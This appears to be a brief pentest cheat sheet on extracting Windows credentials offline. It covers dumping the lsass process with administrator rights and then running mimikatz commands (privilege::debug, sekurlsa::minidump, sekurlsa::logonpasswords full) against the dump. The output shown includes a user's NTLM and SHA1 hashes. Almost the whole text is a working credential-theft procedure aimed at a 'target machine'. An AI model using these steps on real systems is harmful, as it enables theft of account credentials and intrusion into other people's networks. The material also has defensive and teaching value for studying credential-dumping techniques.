### mimikatz lsass.DMP local analyze

if we cant run mimikatz on target machine, we can get dump of lsass process and analyze local computer.

Create dump of process (need administrator rights)

![image](https://user-images.githubusercontent.com/13157446/130370304-7543ddde-fe67-4094-95d8-df3ecf252352.png)


Dump file is located

	C:\Users\win10\AppData\Local\Temp\lsass.DMP


Get passwords


	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::minidump lsass.DMP
	Switch to MINIDUMP : 'lsass.DMP'

	mimikatz # sekurlsa::logonpasswords full
	Opening : 'lsass.DMP' file for minidump...

	Authentication Id : 0 ; 2436075 (00000000:00252beb)
	Session           : Interactive from 1
	User Name         : win10
	Domain            : LOKI
	Logon Server      : LOKI
	Logon Time        : 8/21/2021 2:28:13 AM
	SID               : S-1-5-21-4116903850-2340306423-3138033007-1000
			msv :
			 [00010000] CredentialKeys
			 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
			 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
			 [00000003] Primary
			 * Username : win10
			 * Domain   : LOKI
			 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
			 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
			tspkg :
			wdigest :
			 * Username : win10
			 * Domain   : LOKI
			 * Password : (null)
			kerberos :
			 * Username : win10
			 * Domain   : LOKI
			 * Password : (null)
			ssp :
			credman :



